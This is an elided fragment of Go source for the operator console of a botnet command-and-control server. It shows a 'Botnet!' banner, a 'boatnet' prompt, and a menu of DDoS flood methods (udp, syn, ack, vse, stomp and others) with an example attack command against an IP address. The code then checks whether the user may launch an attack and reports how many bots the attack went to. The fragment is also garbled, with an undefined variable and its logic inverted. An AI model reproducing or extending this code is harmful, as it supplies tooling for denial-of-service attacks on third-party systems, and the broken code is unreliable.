...
func (this *Admin) Handle() {
	...
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		this.conn.Write(append([]byte("\r\033[00m\033[00mVerify \033[01;37m"), spinBuf[i%len(spinBuf)]))
	...
	go func() {
        ...
        this.conn.Write([]byte("\x1b[0mBotnet!\r\n"))
        this.conn.Write([]byte("\r\n"))
	...
	for {
		...
		var botCount int
        this.conn.Write([]byte("\x1b[0m[" + username + "\x1b[1;37m@\x1b[0mboatnet\x1b[1;37m]\033[0m "))
		...
		if cmd == "help" || cmd == "HELP" { // display help menu
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[0mmethods\r\n"))
			this.conn.Write([]byte("\x1b[0mbots\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		...
		if cmd == "METHODS" || cmd == "methods"  || cmd == "?" { // display methods and how to send an attack
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[0mPreset\x1b[0m:\x1b[0m !stdflood <target> <time>\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[0mExample\x1b[0m:\x1b[0m!udp 1.1.1.1 30 dport=80 len=1400\x1b[0m\r\n"))
            this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[0mtcp\r\n"))
			this.conn.Write([]byte("\x1b[0mudp\r\n"))
			this.conn.Write([]byte("\x1b[0mstd\r\n"))
            this.conn.Write([]byte("\x1b[0mfrag\r\n"))
            this.conn.Write([]byte("\x1b[0mvse\r\n"))
            this.conn.Write([]byte("\x1b[0mack\r\n"))
            this.conn.Write([]byte("\x1b[0mstomp\r\n"))
            this.conn.Write([]byte("\x1b[0msyn\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		...
		if err != nil {
			...
			if err != nil {
				...
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    ...
                    this.conn.Write([]byte(fmt.Sprintf("\033[0mAttack has been sent to \033[1;32m%d\r\n", YotCount)))
				} else {
